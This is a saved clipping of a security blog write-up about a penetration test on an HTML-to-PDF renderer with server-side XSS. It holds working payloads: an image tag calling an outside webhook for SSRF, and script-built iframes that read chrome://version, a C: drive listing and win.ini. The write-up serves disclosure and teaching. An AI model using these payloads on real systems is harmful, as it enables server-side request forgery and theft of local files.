---
author: neodyme.io
aliases:
  - "HTML to PDF Renderer: A Tale of Local File Access and Shellcode Execution"
tags:
  - readwise/articles
url: https://neodyme.io/en/blog/html_renderer_to_rce/#tldr?__readwiseLocation=
date: 2025-05-08
summary: A recent exploration of an HTML to PDF renderer revealed it was using an outdated version of Chromium, which allowed for remote code execution. By exploiting vulnerabilities in this version, the researchers demonstrated how server-side XSS could lead to severe security risks, including unauthorized file access. This case highlights the importance of thorough security testing and the need to treat all user inputs with caution.
---
# HTML to PDF Renderer: A Tale of Local File Access and Shellcode Execution

![rw-book-cover](https://neodyme.io/_astro/html_pdf_renderer.WN0D8vsm.png)


In a recent engagement, we found an HTML to PDF converter API endpoint that allowed us to list local directories and files on a remote server. [](https://read.readwise.io/read/01jtqjwze4bma8pzekq52pwagy)

## Introduction and Server-Side XSS

The service we’ve tested allowed us to generate PDF invoices with dynamic content. [](https://read.readwise.io/read/01jtqjz76adevbqyqwgv651eyn)

Encoded HTML passed to a web server? That made our [XSS](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Cross-Site%20Scripting%20(XSS).md) senses tingle! Having worked with HTML to PDF renderers before, server-side XSS instantly came to my mind. [](https://read.readwise.io/read/01jtqk0d8b06s6vqv4b9atzybj)

This malicious code then gets evaluated on the remote server. The impact of such attacks can cause:
- [Server Side Request Forgery (SSRF)](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Server%20Side%20Request%20Forgery%20(SSRF).md) via iframes, images, or even JavaScript
- [File Inclusion (LFI & RFI)](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/File%20Inclusion%20(LFI%20&%20RFI).md) via iframes
- Internal data leak of cookies and application storage in general
- Execute JavaScript if enabled in the browser [](https://read.readwise.io/read/01jtqk1ka64yeqtp4d88z4z6pq)

### Server Side XSS in the EO.WebView framework

The [documentation](https://www.essentialobjects.com/doc/pdf/htmltopdf/overview.html) provides a short example code to convert an HTML file to a PDF:
`EO.Pdf.HtmlToPdf.ConvertUrl("c:\\test.html", "c:\\result.pdf");` [](https://read.readwise.io/read/01jtqk4bsfx07zr46bxa3wj8mw)

Let’s test out some payloads! We started with SSRF, as we expected this to work even if JavaScript is not allowed in the renderer:
```html
<html>
<body>
<img src="https://webhook.site/74db201f-292d-4197-b338-a468515182ef">
</body>
</html>
```

And we got a hit on our webhook! [](https://read.readwise.io/read/01jtqk52xcmx60hpnjk4w1412e)

We decided to fiddle around a bit more and try JavaScript and `chrome://version` to get more details. We tested JavaScript execution by dynamically appending an `<iframe>` element to the website, allowing us to embed “sub-pages” in our PDF:
```html
<html>
<body>
<script>
var iframe = document.createElement('iframe');
iframe.height = 1000
iframe.width = 1000
iframe.src="chrome://version";
document.body.appendChild(iframe)
</script>
</body>
</html>
```

![](https://neodyme.io/blog/html_renderer_to_rce/detailed_version.png)


Last but not least, we tried to read directories and files:
```html
<html>
<body>
<script>
var iframe = document.createElement('iframe');
iframe.height = 300
iframe.width = 1000
iframe.src="file://C:/";
document.body.appendChild(iframe);
var iframe2 = document.createElement('iframe');
iframe2.height = 300
iframe2.width = 1000
iframe2.src="file://C:/windows/win.ini";
document.body.appendChild(iframe2);
</script>
</body>
</html>
```

![](https://neodyme.io/blog/html_renderer_to_rce/file_read.png)

